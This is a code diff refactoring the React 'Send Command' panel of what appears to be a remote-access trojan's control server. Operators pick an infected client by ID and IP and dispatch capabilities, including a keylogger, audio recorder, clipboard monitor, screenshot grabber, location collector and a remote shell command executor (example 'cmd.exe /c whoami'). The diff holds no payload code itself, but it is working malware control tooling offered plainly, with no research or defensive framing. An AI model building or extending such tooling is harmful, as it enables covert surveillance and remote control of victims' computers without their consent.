@@ -1,39 +1,38 @@
 import React, { useState, useEffect } from 'react';
 import { api } from '../api';
 
+const CAPABILITIES = {
+  1: { name: 'Audio Recorder', needsArgs: false, hint: 'Records audio from the client' },
+  2: { name: 'Clipboard Monitor', needsArgs: false, hint: 'Captures clipboard content' },
+  3: { name: 'Keylogger', needsArgs: false, hint: 'Logs keystrokes' },
+  4: { name: 'Screenshot', needsArgs: false, hint: 'Takes a screenshot' },
+  5: { name: 'Info Collector', needsArgs: false, hint: 'Collects system information' },
+  6: { name: 'Command Executor', needsArgs: true, hint: 'Executes a shell command', placeholder: 'cmd.exe /c whoami' },
+  7: { name: 'Location Collector', needsArgs: false, hint: 'Collects location data' }
+};
+
 function Commands() {
-  const [clients, setClients] = useState({});
-  const [capabilities, setCapabilities] = useState({});
+  const [clients, setClients] = useState([]);
   const [selectedClient, setSelectedClient] = useState('');
-  const [selectedCapability, setSelectedCapability] = useState('1');
-  const [commandArgs, setCommandArgs] = useState('');
+  const [selectedCapability, setSelectedCapability] = useState('5');
+  const [args, setArgs] = useState('');
   const [message, setMessage] = useState(null);
-  const [loading, setLoading] = useState(false);
+  const [sending, setSending] = useState(false);
 
   useEffect(() => {
     fetchClients();
-    fetchCapabilities();
   }, []);
 
   const fetchClients = async () => {
     try {
       const data = await api.getClients();
-      setClients(data.clients || {});
+      setClients(Object.values(data.clients || {}));
     } catch (error) {
       console.error('Error fetching clients:', error);
     }
   };
 
-  const fetchCapabilities = async () => {
-    try {
-      const caps = await api.getCapabilities();
-      setCapabilities(caps);
-    } catch (error) {
-      console.error('Error fetching capabilities:', error);
-    }
-  };
-
-  const handleSendCommand = async (e) => {
+  const handleSend = async (e) => {
     e.preventDefault();
     
     if (!selectedClient) {
@@ -41,122 +40,107 @@ function Commands() {
       return;
     }
 
-    setLoading(true);
+    const capability = CAPABILITIES[selectedCapability];
+    if (capability.needsArgs && !args.trim()) {
+      setMessage({ type: 'error', text: 'This capability requires arguments' });
+      return;
+    }
+
+    setSending(true);
     setMessage(null);
 
     try {
-      const result = await api.sendCommand(selectedClient, parseInt(selectedCapability), commandArgs);
+      await api.sendCommand(selectedClient, parseInt(selectedCapability), args);
       setMessage({ 
         type: 'success', 
-        text: `Command sent successfully: ${result.capability_name}${commandArgs ? ' with args: ' + commandArgs : ''}` 
+        text: `✓ Command sent: ${capability.name}` 
       });
+      setArgs('');
       setTimeout(() => setMessage(null), 5000);
-      setCommandArgs(''); // Clear args after sending
     } catch (error) {
       setMessage({ 
         type: 'error', 
-        text: `Failed to send command: ${error.response?.data?.message || error.message}` 
+        text: `Failed: ${error.response?.data?.message || error.message}` 
       });
     } finally {
-      setLoading(false);
+      setSending(false);
     }
   };
 
-  const clientArray = Object.values(clients);
+  const capability = CAPABILITIES[selectedCapability];
 
   return (
     <div>
       <div className="card">
-        <h2>Send Command to Client</h2>
+        <h2>Send Command</h2>
         
         {message && (
-          <div className={message.type === 'error' ? 'error' : 'success'}>
+          <div className={`alert ${message.type}`}>
             {message.text}
           </div>
         )}
 
-        <form onSubmit={handleSendCommand}>
+        <form onSubmit={handleSend}>
           <div className="form-group">
-            <label htmlFor="client">Select Client</label>
+            <label>Select Client</label>
             <select
-              id="client"
               value={selectedClient}
               onChange={(e) => setSelectedClient(e.target.value)}
               required
             >
-              <option value="">-- Select a client --</option>
-              {clientArray.map((client) => (
+              <option value="">-- Choose a client --</option>
+              {clients.map((client) => (
                 <option key={client.id} value={client.id}>
-                  {client.id} ({client.ip})
+                  {client.id} - {client.ip}
                 </option>
               ))}
             </select>
           </div>
 
           <div className="form-group">
-            <label htmlFor="capability">Select Capability</label>
+            <label>Select Capability</label>
             <select
-              id="capability"
               value={selectedCapability}
               onChange={(e) => setSelectedCapability(e.target.value)}
               required
             >
-              {Object.entries(capabilities)
-                .filter(([id]) => id !== '0') // Exclude "No Command"
-                .map(([id, name]) => (
-                  <option key={id} value={id}>
-                    {id} - {name}
-                  </option>
-                ))}
+              {Object.entries(CAPABILITIES).map(([id, cap]) => (
+                <option key={id} value={id}>
+                  {cap.name}
+                </option>
+              ))}
             </select>
+            <small>{capability.hint}</small>
           </div>
 
-          <div className="form-group">
-            <label htmlFor="args">Command Arguments (optional)</label>
-            <input
-              type="text"
-              id="args"
-              value={commandArgs}
-              onChange={(e) => setCommandArgs(e.target.value)}
-              placeholder={
-                selectedCapability === '6' 
-                  ? 'e.g., cmd.exe /c whoami' 
-                  : 'Additional parameters for the capability'
-              }
-            />
-            <small style={{ color: '#888', fontSize: '0.85em', marginTop: '5px', display: 'block' }}>
-              {selectedCapability === '6' && 'For Command Executor: Enter the full command to execute'}
-              {selectedCapability === '1' && 'For Audio Recorder: Optional duration or quality parameters'}
-              {!['1', '6'].includes(selectedCapability) && 'Most capabilities don\'t require arguments'}
-            </small>
-          </div>
+          {capability.needsArgs && (
+            <div className="form-group">
+              <label>Command Arguments</label>
+              <input
+                type="text"
+                value={args}
+                onChange={(e) => setArgs(e.target.value)}
+                placeholder={capability.placeholder}
+                required
+              />
+            </div>
+          )}
 
-          <button type="submit" className="btn" disabled={loading}>
-            {loading ? 'Sending...' : 'Send Command'}
+          <button type="submit" className="btn" disabled={sending}>
+            {sending ? 'Sending...' : 'Send Command'}
           </button>
         </form>
       </div>
 
       <div className="card">
-        <h2>Capability Reference</h2>
-        <table className="table">
-          <thead>
-            <tr>
-              <th>ID</th>
-              <th>Capability</th>
-            </tr>
-          </thead>
-          <tbody>
-            {Object.entries(capabilities)
-              .filter(([id]) => id !== '0')
-              .map(([id, name]) => (
-                <tr key={id}>
-                  <td>{id}</td>
-                  <td>{name}</td>
-                </tr>
-              ))}
-          </tbody>
-        </table>
+        <h2>Available Capabilities</h2>
+        <div className="info-block">
+          {Object.entries(CAPABILITIES).map(([id, cap]) => (
+            <div key={id}>
+              <strong>{id}.</strong> {cap.name} - {cap.hint}
+            </div>
+          ))}
+        </div>
       </div>
     </div>
   );
